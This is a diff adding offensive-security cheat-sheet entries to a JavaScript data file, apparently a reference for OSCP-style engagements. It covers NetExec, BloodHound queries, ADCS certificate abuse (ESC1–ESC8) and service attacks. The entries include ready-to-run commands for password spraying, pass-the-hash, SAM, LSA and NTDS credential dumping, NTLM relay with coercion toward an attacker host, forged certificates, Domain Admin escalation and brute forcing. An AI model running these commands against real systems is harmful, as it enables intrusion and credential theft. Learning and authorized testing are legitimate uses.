@@ -16167,5 +16167,761 @@ module.exports = [
         ]
       }
     ]
+  },
+  {
+    "id": "netexec",
+    "name": "NetExec / CrackMapExec",
+    "icon": "🕸️",
+    "description": "NetExec (nxc) and CrackMapExec for Active Directory enumeration, lateral movement, and credential attacks.",
+    "subcategories": [
+      {
+        "name": "SMB Enumeration",
+        "commands": [
+          { "title": "NXC SMB Host Discovery", "desc": "Discover live hosts and OS info via SMB", "cmd": "nxc smb <SUBNET>/24", "tags": ["essential","tool"] },
+          { "title": "NXC SMB Null Session", "desc": "Test null session authentication", "cmd": "nxc smb <TARGET_IP> -u '' -p ''", "tags": ["essential"] },
+          { "title": "NXC SMB Guest Session", "desc": "Test guest authentication", "cmd": "nxc smb <TARGET_IP> -u 'guest' -p ''", "tags": ["essential"] },
+          { "title": "NXC SMB Enumerate Shares", "desc": "List all SMB shares", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --shares", "tags": ["essential"] },
+          { "title": "NXC SMB Enumerate Users", "desc": "List domain users via RID brute force", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --users", "tags": ["essential"] },
+          { "title": "NXC SMB Enumerate Groups", "desc": "List domain groups", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --groups", "tags": ["essential"] },
+          { "title": "NXC SMB Enumerate Logged Users", "desc": "Show currently logged in users", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --loggedon-users", "tags": ["essential"] },
+          { "title": "NXC SMB Password Policy", "desc": "Get domain password policy", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --pass-pol", "tags": ["essential"] },
+          { "title": "NXC SMB RID Brute", "desc": "Enumerate users via RID cycling (no creds needed)", "cmd": "nxc smb <TARGET_IP> -u '' -p '' --rid-brute", "tags": ["tool"] },
+          { "title": "NXC SMB Enumerate Sessions", "desc": "Show active SMB sessions", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --sessions", "tags": ["essential"] },
+          { "title": "NXC SMB Disks", "desc": "List local disks", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --disks", "tags": ["tool"] },
+          { "title": "NXC SMB Local Groups", "desc": "Enumerate local groups", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --local-groups", "tags": ["essential"] },
+          { "title": "NXC SMB Interfaces", "desc": "List network interfaces", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --interfaces", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "SMB Authentication & Exec",
+        "commands": [
+          { "title": "NXC SMB Password Spray", "desc": "Password spray against multiple hosts", "cmd": "nxc smb <SUBNET>/24 -u <USER> -p '<PASS>' --continue-on-success", "tags": ["essential"] },
+          { "title": "NXC SMB User List Spray", "desc": "Spray a password against a user list", "cmd": "nxc smb <TARGET_IP> -u users.txt -p '<PASS>' --continue-on-success", "tags": ["essential"] },
+          { "title": "NXC SMB Pass the Hash", "desc": "Authenticate using NTLM hash", "cmd": "nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH>", "tags": ["essential"] },
+          { "title": "NXC SMB Execute Command", "desc": "Run command via SMBExec", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami /all'", "tags": ["essential"] },
+          { "title": "NXC SMB PowerShell Exec", "desc": "Run PowerShell command via SMB", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -X 'Get-Process'", "tags": ["essential"] },
+          { "title": "NXC SMB WMI Exec", "desc": "Execute command via WMI", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami' --exec-method wmiexec", "tags": ["essential"] },
+          { "title": "NXC SMB AT Exec", "desc": "Execute command via scheduled task", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami' --exec-method atexec", "tags": ["tool"] },
+          { "title": "NXC SMB Kerberos Auth", "desc": "Authenticate using Kerberos ticket", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -k", "tags": ["tool"] },
+          { "title": "NXC Local Auth", "desc": "Use local account instead of domain", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --local-auth", "tags": ["essential"] },
+          { "title": "NXC SMB Check Admin", "desc": "Check if credentials have admin access", "cmd": "nxc smb <SUBNET>/24 -u <USER> -p '<PASS>' --local-auth", "tags": ["essential"], "note": "Pwn3d! = admin access confirmed" }
+        ]
+      },
+      {
+        "name": "SMB Modules",
+        "commands": [
+          { "title": "NXC SAM Dump", "desc": "Dump SAM database (local hashes)", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --sam", "tags": ["essential"] },
+          { "title": "NXC LSA Dump", "desc": "Dump LSA secrets", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --lsa", "tags": ["essential"] },
+          { "title": "NXC NTDS Dump", "desc": "Dump NTDS.dit (domain hashes) via DCSync", "cmd": "nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds", "tags": ["essential"] },
+          { "title": "NXC Mimikatz Module", "desc": "Run Mimikatz logonpasswords", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M mimikatz", "tags": ["tool"] },
+          { "title": "NXC Lsassy Module", "desc": "Dump credentials with lsassy", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M lsassy", "tags": ["tool"] },
+          { "title": "NXC Spider Shares", "desc": "Spider SMB shares for interesting files", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus", "tags": ["essential"] },
+          { "title": "NXC GPP Passwords", "desc": "Search for GPP stored passwords", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M gpp_password", "tags": ["essential"] },
+          { "title": "NXC GPP Auto-Login", "desc": "Find GPP autologin credentials", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M gpp_autologin", "tags": ["essential"] },
+          { "title": "NXC Zerologon Check", "desc": "Check for Zerologon vulnerability", "cmd": "nxc smb <DC_IP> -u '' -p '' -M zerologon", "tags": ["tool"] },
+          { "title": "NXC PetitPotam Check", "desc": "Check for PetitPotam vulnerability", "cmd": "nxc smb <DC_IP> -u '' -p '' -M petitpotam", "tags": ["tool"] },
+          { "title": "NXC MS17-010 Check", "desc": "Check for EternalBlue vulnerability", "cmd": "nxc smb <TARGET_IP> -u '' -p '' -M ms17-010", "tags": ["essential"] },
+          { "title": "NXC Printnightmare Check", "desc": "Check for PrintNightmare", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M printnightmare", "tags": ["tool"] },
+          { "title": "NXC Put File", "desc": "Upload file to target share", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --put-file /local/file.txt '\\\\<SHARE>\\file.txt'", "tags": ["tool"] },
+          { "title": "NXC Get File", "desc": "Download file from target share", "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --get-file '\\\\<SHARE>\\file.txt' /local/file.txt", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "WinRM / LDAP / MSSQL",
+        "commands": [
+          { "title": "NXC WinRM Auth Check", "desc": "Test WinRM authentication", "cmd": "nxc winrm <TARGET_IP> -u <USER> -p '<PASS>'", "tags": ["essential"] },
+          { "title": "NXC WinRM Execute", "desc": "Run command over WinRM", "cmd": "nxc winrm <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami'", "tags": ["essential"] },
+          { "title": "NXC WinRM Shell", "desc": "Get interactive shell via WinRM", "cmd": "nxc winrm <TARGET_IP> -u <USER> -p '<PASS>' --shell", "tags": ["essential"] },
+          { "title": "NXC LDAP Enumerate", "desc": "LDAP enumeration with credentials", "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --query '(objectClass=user)' ''", "tags": ["tool"] },
+          { "title": "NXC LDAP Kerberoast", "desc": "Find Kerberoastable users via LDAP", "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting output.txt", "tags": ["essential"] },
+          { "title": "NXC LDAP ASREPRoast", "desc": "Find AS-REP roastable users", "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --asreproast output.txt", "tags": ["essential"] },
+          { "title": "NXC LDAP Trusted For Delegation", "desc": "Find unconstrained delegation accounts", "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --trusted-for-delegation", "tags": ["essential"] },
+          { "title": "NXC LDAP Password Not Required", "desc": "Find accounts with no password required", "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --password-not-required", "tags": ["essential"] },
+          { "title": "NXC MSSQL Auth", "desc": "Authenticate to MSSQL", "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>'", "tags": ["essential"] },
+          { "title": "NXC MSSQL Execute Query", "desc": "Run SQL query", "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -q 'SELECT name FROM master.dbo.sysdatabases'", "tags": ["essential"] },
+          { "title": "NXC MSSQL OS Command", "desc": "Execute OS command via xp_cmdshell", "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami'", "tags": ["essential"] }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "bloodhound",
+    "name": "BloodHound & SharpHound",
+    "icon": "🐕",
+    "description": "BloodHound AD attack path analysis, SharpHound collection, and useful Cypher queries for privilege escalation paths.",
+    "subcategories": [
+      {
+        "name": "SharpHound Collection",
+        "commands": [
+          { "title": "SharpHound All Collection", "desc": "Collect all data types", "cmd": "SharpHound.exe -c All --outputdirectory C:\\Temp", "tags": ["essential","tool"] },
+          { "title": "SharpHound Default Collection", "desc": "Default collection (fastest)", "cmd": "SharpHound.exe -c Default", "tags": ["essential"] },
+          { "title": "SharpHound DCOnly", "desc": "Only collect from DC (stealthy)", "cmd": "SharpHound.exe -c DCOnly", "tags": ["tool"] },
+          { "title": "SharpHound with Domain", "desc": "Specify domain to collect from", "cmd": "SharpHound.exe -c All -d <DOMAIN>", "tags": ["essential"] },
+          { "title": "SharpHound Custom DC", "desc": "Specify domain controller", "cmd": "SharpHound.exe -c All --DomainController <DC_IP> -d <DOMAIN>", "tags": ["tool"] },
+          { "title": "SharpHound Stealth Mode", "desc": "Stealth collection using LDAP only", "cmd": "SharpHound.exe -c Stealth", "tags": ["advanced"] },
+          { "title": "BloodHound.py Collection", "desc": "Remote collection from Linux", "cmd": "bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -dc <DC_IP> -c All --zip", "tags": ["essential","tool"] },
+          { "title": "BloodHound.py via NTLM Hash", "desc": "Collection using pass-the-hash", "cmd": "bloodhound-python -u <USER> --hashes :<NTLM_HASH> -d <DOMAIN> -dc <DC_IP> -c All --zip", "tags": ["tool"] },
+          { "title": "RustHound Collection", "desc": "Rust-based BloodHound collector", "cmd": "rusthound -d <DOMAIN> -u '<USER>@<DOMAIN>' -p '<PASS>' -i <DC_IP> -o /tmp/bh --zip", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "BloodHound Setup",
+        "commands": [
+          { "title": "Start Neo4j", "desc": "Start Neo4j database for BloodHound", "cmd": "sudo neo4j start", "tags": ["essential"] },
+          { "title": "Neo4j Console", "desc": "Open Neo4j web console", "cmd": "sudo neo4j console", "tags": ["tool"] },
+          { "title": "BloodHound Start (Linux)", "desc": "Launch BloodHound GUI", "cmd": "bloodhound &", "tags": ["essential"] },
+          { "title": "BloodHound CE Docker", "desc": "Run BloodHound Community Edition in Docker", "cmds": ["docker run -d -p 8080:8080 -p 7687:7687 -p 7474:7474 --name bloodhound specterops/bloodhound-ce"], "tags": ["tool"] },
+          { "title": "Neo4j Clear Database", "desc": "Clear all BloodHound data from Neo4j", "cmd": "MATCH (n) DETACH DELETE n", "tags": ["tool"], "note": "Run in Neo4j browser at :7474" }
+        ]
+      },
+      {
+        "name": "Cypher Queries",
+        "commands": [
+          { "title": "Find All DA Paths from Owned", "desc": "Attack paths from owned users to Domain Admins", "cmd": "MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p", "tags": ["essential"], "note": "Run in BloodHound raw query or Neo4j browser" },
+          { "title": "Find Kerberoastable Users", "desc": "Users with SPNs (Kerberoastable)", "cmd": "MATCH (u:User {hasspn:true}) RETURN u.name, u.description ORDER BY u.name", "tags": ["essential"] },
+          { "title": "Find AS-REP Roastable", "desc": "Users with pre-auth disabled", "cmd": "MATCH (u:User {dontreqpreauth:true}) RETURN u.name", "tags": ["essential"] },
+          { "title": "Find Unconstrained Delegation", "desc": "Computers with unconstrained delegation", "cmd": "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name", "tags": ["essential"] },
+          { "title": "Find Constrained Delegation", "desc": "Accounts with constrained delegation", "cmd": "MATCH (u) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate", "tags": ["essential"] },
+          { "title": "Find Local Admin Paths", "desc": "Who has local admin on which computers", "cmd": "MATCH p=(u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name", "tags": ["essential"] },
+          { "title": "Find High Value Targets", "desc": "Computers and users marked high value", "cmd": "MATCH (n {highvalue:true}) RETURN n.name, labels(n)", "tags": ["essential"] },
+          { "title": "Find DCSync Rights", "desc": "Who can DCSync (DS-Replication-Get-Changes-All)", "cmd": "MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p", "tags": ["essential"] },
+          { "title": "Find WriteDACL to Domain", "desc": "Accounts with WriteDACL on domain object", "cmd": "MATCH p=(n)-[:WriteDacl]->(d:Domain) RETURN p", "tags": ["advanced"] },
+          { "title": "Find GenericAll on DA Group", "desc": "Who has GenericAll on Domain Admins", "cmd": "MATCH p=(n)-[:GenericAll]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) RETURN p", "tags": ["essential"] },
+          { "title": "Find Shadow Credentials Path", "desc": "Accounts that can add KeyCredentialLink", "cmd": "MATCH p=(n)-[:AddKeyCredentialLink]->(m) RETURN p", "tags": ["advanced"] },
+          { "title": "Shortest Path to DA", "desc": "Shortest path from any node to Domain Admin", "cmd": "MATCH p=shortestPath((n)-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) WHERE NOT n=g RETURN p LIMIT 10", "tags": ["essential"] },
+          { "title": "Find All Groups for User", "desc": "All group memberships including nested", "cmd": "MATCH p=(u:User {name:'<USER>@<DOMAIN>'})-[:MemberOf*1..]->(g:Group) RETURN g.name", "tags": ["tool"] },
+          { "title": "Find LAPS Readable", "desc": "Who can read LAPS passwords", "cmd": "MATCH p=(u)-[:ReadLAPSPassword]->(c:Computer) RETURN u.name, c.name", "tags": ["essential"] },
+          { "title": "Find GMSA Readable", "desc": "Who can read GMSA passwords", "cmd": "MATCH p=(u)-[:ReadGMSAPassword]->(a:User) RETURN p", "tags": ["tool"] },
+          { "title": "Find Owned Admins", "desc": "Owned accounts with admin rights", "cmd": "MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer) RETURN u.name, c.name", "tags": ["essential"] },
+          { "title": "Find Password in Description", "desc": "Users with potential passwords in description", "cmd": "MATCH (u:User) WHERE u.description CONTAINS 'pass' OR u.description CONTAINS 'pwd' RETURN u.name, u.description", "tags": ["advanced"] }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "adcs-attacks",
+    "name": "ADCS — Certificate Services Attacks",
+    "icon": "📜",
+    "description": "Active Directory Certificate Services exploitation — ESC1 through ESC8 using Certipy, Certutil, and related tools.",
+    "subcategories": [
+      {
+        "name": "Certipy Enumeration",
+        "commands": [
+          { "title": "Certipy Find Vulnerabilities", "desc": "Enumerate ADCS and find vulnerable templates", "cmd": "certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout", "tags": ["essential","tool"] },
+          { "title": "Certipy Find All Templates", "desc": "List all certificate templates", "cmd": "certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -stdout", "tags": ["essential"] },
+          { "title": "Certipy Find via Hash", "desc": "Enumerate ADCS with NTLM hash", "cmd": "certipy find -u '<USER>@<DOMAIN>' -hashes :<NTLM_HASH> -dc-ip <DC_IP> -vulnerable -stdout", "tags": ["tool"] },
+          { "title": "Certify Find (Windows)", "desc": "Find vulnerable certificate templates from Windows", "cmd": "Certify.exe find /vulnerable", "tags": ["essential","tool"] },
+          { "title": "Certify Find All (Windows)", "desc": "List all certificate templates from Windows", "cmd": "Certify.exe find", "tags": ["tool"] },
+          { "title": "NXC LDAP ADCS Enum", "desc": "Find ADCS servers via NXC", "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M adcs", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "ESC1 — SAN Impersonation",
+        "commands": [
+          { "title": "ESC1 Request as DA (Certipy)", "desc": "Request cert with DA UPN in SAN field", "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>'", "tags": ["essential"] },
+          { "title": "ESC1 Auth with Certificate", "desc": "Authenticate using obtained certificate", "cmd": "certipy auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>", "tags": ["essential"] },
+          { "title": "ESC1 Request (Certify)", "desc": "Request cert as another user (Windows)", "cmd": "Certify.exe request /ca:<CA_SERVER>\\<CA_NAME> /template:<TEMPLATE> /altname:administrator", "tags": ["tool"] },
+          { "title": "Convert PEM to PFX", "desc": "Convert Certify output to PFX for use with Rubeus", "cmds": ["openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx"], "tags": ["essential"] }
+        ]
+      },
+      {
+        "name": "ESC2, ESC3, ESC4",
+        "commands": [
+          { "title": "ESC2 Any Purpose Template", "desc": "Any Purpose EKU allows auth — request cert with SAN", "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template '<ESC2_TEMPLATE>' -upn 'administrator@<DOMAIN>'", "tags": ["advanced"] },
+          { "title": "ESC3 Enrollment Agent Request", "desc": "Step 1: Obtain enrollment agent certificate", "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template '<ESC3_TEMPLATE>'", "tags": ["advanced"] },
+          { "title": "ESC3 On-Behalf-Of Request", "desc": "Step 2: Request cert on behalf of DA", "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template 'User' -on-behalf-of '<DOMAIN>\\administrator' -pfx agent.pfx", "tags": ["advanced"] },
+          { "title": "ESC4 Template Write Abuse", "desc": "Modify template to be vulnerable (ESC1 config)", "cmd": "certipy template -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -template '<TEMPLATE>' -save-old", "tags": ["advanced"] }
+        ]
+      },
+      {
+        "name": "ESC6, ESC7, ESC8",
+        "commands": [
+          { "title": "ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2", "desc": "CA allows SAN in any template — request with UPN", "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template 'User' -upn 'administrator@<DOMAIN>'", "tags": ["advanced"] },
+          { "title": "ESC7 Manage CA Rights", "desc": "Add ManageCA right to enable EDITF flag", "cmds": ["certipy ca -ca '<CA_NAME>' -add-officer <USER> -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP>", "certipy ca -ca '<CA_NAME>' -enable-template 'SubCA' -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP>"], "tags": ["advanced"] },
+          { "title": "ESC8 Web Enrollment NTLM Relay", "desc": "Relay DC$ auth to ADCS HTTP enrollment", "cmds": ["ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'", "coercer coerce -u <USER> -p '<PASS>' -d <DOMAIN> -l <ATTACKER_IP> -t <DC_IP>"], "tags": ["advanced"] },
+          { "title": "Golden Certificate (Certipy)", "desc": "Forge certificate using stolen CA key", "cmd": "certipy forge -ca-pfx ca.pfx -upn 'administrator@<DOMAIN>' -subject 'CN=Administrator'", "tags": ["advanced"] }
+        ]
+      },
+      {
+        "name": "Certificate Authentication",
+        "commands": [
+          { "title": "Certipy Auth PKINIT", "desc": "Authenticate using certificate to get TGT + NTLM hash", "cmd": "certipy auth -pfx <USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP>", "tags": ["essential"] },
+          { "title": "Rubeus PKINIT Auth", "desc": "Use certificate for Kerberos auth (Windows)", "cmd": "Rubeus.exe asktgt /user:<USER> /certificate:<CERT.pfx> /password:<PFX_PASS> /ptt", "tags": ["tool"] },
+          { "title": "PassTheCert LDAP", "desc": "Use certificate to authenticate to LDAP", "cmd": "passthecert.py -action whoami -crt <USER>.crt -key <USER>.key -domain <DOMAIN> -dc-ip <DC_IP>", "tags": ["advanced"] },
+          { "title": "PassTheCert Add DA", "desc": "Add user to Domain Admins via cert auth", "cmd": "passthecert.py -action modify_user -crt <USER>.crt -key <USER>.key -domain <DOMAIN> -dc-ip <DC_IP> -target <USER_TO_PROMOTE> -elevate", "tags": ["advanced"] }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "service-exploitation",
+    "name": "Network Service Exploitation",
+    "icon": "🔌",
+    "description": "Service-specific exploitation techniques for common ports found during OSCP-style engagements.",
+    "subcategories": [
+      {
+        "name": "FTP (21)",
+        "commands": [
+          { "title": "FTP Anonymous Login", "desc": "Test anonymous FTP access", "cmd": "ftp <TARGET_IP>", "tags": ["essential"], "note": "Username: anonymous, Password: anything or blank" },
+          { "title": "FTP List Files Recursively", "desc": "List all files recursively after login", "cmd": "wget -r --no-passive ftp://anonymous:anonymous@<TARGET_IP>/", "tags": ["essential"] },
+          { "title": "Hydra FTP Brute Force", "desc": "Brute force FTP credentials", "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>", "tags": ["tool"] },
+          { "title": "FTP Bounce Scan", "desc": "Use FTP bounce for port scanning", "cmd": "nmap -b anonymous@<FTP_IP> <TARGET_IP>", "tags": ["advanced"] },
+          { "title": "FTP Binary Transfer", "desc": "Transfer binary file (avoid corruption)", "cmd": "ftp> binary", "tags": ["essential"], "note": "Run inside FTP session before transferring executables" },
+          { "title": "FTP Get All Files", "desc": "Download all files from FTP", "cmd": "wget -m ftp://anonymous:anonymous@<TARGET_IP>", "tags": ["essential"] },
+          { "title": "cURL FTP Enum", "desc": "List FTP directory with curl", "cmd": "curl -v ftp://<TARGET_IP>/ --user anonymous:anonymous", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "SSH (22)",
+        "commands": [
+          { "title": "SSH Connect Basic", "desc": "Connect to SSH server", "cmd": "ssh <USER>@<TARGET_IP>", "tags": ["essential"] },
+          { "title": "SSH with Private Key", "desc": "Connect using private key file", "cmd": "ssh -i id_rsa <USER>@<TARGET_IP>", "tags": ["essential"] },
+          { "title": "SSH Fix Key Permissions", "desc": "Fix private key permissions before use", "cmd": "chmod 600 id_rsa", "tags": ["essential"] },
+          { "title": "Hydra SSH Brute Force", "desc": "Brute force SSH credentials", "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>", "tags": ["tool"] },
+          { "title": "SSH User Enum (CVE-2018-15473)", "desc": "Enumerate valid SSH users", "cmd": "python3 ssh_user_enum.py --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt --ip <TARGET_IP>", "tags": ["advanced"] },
+          { "title": "SSH Tunnel Local Forward", "desc": "Forward local port to remote service", "cmd": "ssh -L <LOCAL_PORT>:<TARGET_HOST>:<TARGET_PORT> <USER>@<JUMP_IP> -N", "tags": ["essential"] },
+          { "title": "SSH Tunnel Remote Forward", "desc": "Expose local service on remote server", "cmd": "ssh -R <REMOTE_PORT>:localhost:<LOCAL_PORT> <USER>@<TARGET_IP> -N", "tags": ["essential"] },
+          { "title": "SSH Dynamic SOCKS Proxy", "desc": "Create SOCKS5 proxy through SSH", "cmd": "ssh -D 1080 <USER>@<TARGET_IP> -N", "tags": ["essential"] },
+          { "title": "SSH ProxyJump", "desc": "Connect through jump host", "cmd": "ssh -J <USER>@<JUMP_IP> <USER>@<FINAL_TARGET>", "tags": ["tool"] },
+          { "title": "SSH Force Password Auth", "desc": "Disable key auth and force password prompt", "cmd": "ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no <USER>@<TARGET_IP>", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "SMTP (25/587)",
+        "commands": [
+          { "title": "SMTP Banner Grab", "desc": "Connect and grab SMTP banner", "cmd": "nc -nv <TARGET_IP> 25", "tags": ["essential"] },
+          { "title": "SMTP VRFY User Enum", "desc": "Enumerate valid users via VRFY command", "cmd": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>", "tags": ["essential","tool"] },
+          { "title": "SMTP EXPN User Enum", "desc": "Enumerate users via EXPN command", "cmd": "smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>", "tags": ["tool"] },
+          { "title": "SMTP RCPT User Enum", "desc": "Enumerate users via RCPT TO method", "cmd": "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>", "tags": ["tool"] },
+          { "title": "SMTP Send Email (Swaks)", "desc": "Send test email via SMTP", "cmd": "swaks --to <VICTIM_EMAIL> --from <SENDER_EMAIL> --server <SMTP_IP> --body 'Test message' --header 'Subject: Test'", "tags": ["tool"] },
+          { "title": "Hydra SMTP Brute", "desc": "Brute force SMTP credentials", "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt smtp://<TARGET_IP>", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "POP3 / IMAP (110/143)",
+        "commands": [
+          { "title": "POP3 Manual Connect", "desc": "Connect to POP3 and check mail", "cmds": ["nc -nv <TARGET_IP> 110", "USER <USER>", "PASS <PASS>", "LIST", "RETR 1"], "tags": ["essential"] },
+          { "title": "IMAP Manual Connect", "desc": "Connect to IMAP manually", "cmds": ["nc -nv <TARGET_IP> 143", "a1 LOGIN <USER> <PASS>", "a2 LIST '' '*'", "a3 SELECT INBOX", "a4 FETCH 1 BODY[]"], "tags": ["essential"] },
+          { "title": "Hydra POP3 Brute", "desc": "Brute force POP3 credentials", "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt pop3://<TARGET_IP>", "tags": ["tool"] },
+          { "title": "cURL IMAP Read Mail", "desc": "Read emails with curl", "cmd": "curl -u <USER>:<PASS> imap://<TARGET_IP>/INBOX", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "DNS (53)",
+        "commands": [
+          { "title": "DNS Zone Transfer", "desc": "Attempt AXFR zone transfer", "cmd": "dig axfr <DOMAIN> @<TARGET_IP>", "tags": ["essential"] },
+          { "title": "DNS Reverse Lookup Zone", "desc": "Attempt reverse zone transfer", "cmd": "dig axfr <REVERSE_ZONE>.in-addr.arpa @<TARGET_IP>", "tags": ["tool"] },
+          { "title": "DNSChef Spoof", "desc": "DNS spoofing proxy", "cmd": "dnschef --fakeip <ATTACKER_IP> --fakedomains <TARGET_DOMAIN> --interface <INTERFACE>", "tags": ["advanced"] },
+          { "title": "Fierce DNS Recon", "desc": "DNS reconnaissance with fierce", "cmd": "fierce --domain <DOMAIN>", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "HTTP/HTTPS (80/443/8080)",
+        "commands": [
+          { "title": "Nikto Web Scan", "desc": "Comprehensive web vulnerability scanner", "cmd": "nikto -h http://<TARGET_IP> -o nikto_output.txt", "tags": ["essential","tool"] },
+          { "title": "cURL Headers", "desc": "Get HTTP headers and response info", "cmd": "curl -I http://<TARGET_IP>", "tags": ["essential"] },
+          { "title": "cURL Follow Redirects", "desc": "Follow HTTP redirects verbosely", "cmd": "curl -Lv http://<TARGET_IP>", "tags": ["tool"] },
+          { "title": "cURL POST Request", "desc": "Submit POST data", "cmd": "curl -X POST http://<TARGET_IP>/login -d 'username=<USER>&password=<PASS>'", "tags": ["essential"] },
+          { "title": "cURL with Cookie", "desc": "Send request with cookie", "cmd": "curl -b 'session=<SESSION_VALUE>' http://<TARGET_IP>/admin", "tags": ["essential"] },
+          { "title": "whatweb Fingerprint", "desc": "Identify web technologies", "cmd": "whatweb -a 3 http://<TARGET_IP>", "tags": ["essential","tool"] },
+          { "title": "wafw00f WAF Detection", "desc": "Detect Web Application Firewalls", "cmd": "wafw00f http://<TARGET_IP>", "tags": ["tool"] }
+        ]
+      },
+      {
+        "name": "SMB (445/139)",
+        "commands": [
+          { "title": "SMBClient List Shares", "desc": "List SMB shares (no auth)", "cmd": "smbclient -L //<TARGET_IP>/ -N", "tags": ["essential"] },
+          { "title": "SMBClient Connect Share", "desc": "Connect to a specific share", "cmd": "smbclient //<TARGET_IP>/<SHARE> -U <USER>", "tags": ["essential"] },
+          { "title": "SMBClient Get File", "desc": "Download file from SMB share", "cmd": "smbclient //<TARGET_IP>/<SHARE> -U <USER> -c 'get <FILENAME>'", "tags": ["essential"] },
+          { "title": "SMBClient Recursive Download", "desc": "Download all files from share recursively", "cmds": ["smbclient //<TARGET_IP>/<SHARE> -U <USER>", "smb: \\> recurse ON", "smb: \\> prompt OFF", "smb: \\> mget *"], "tags": ["essential"] },
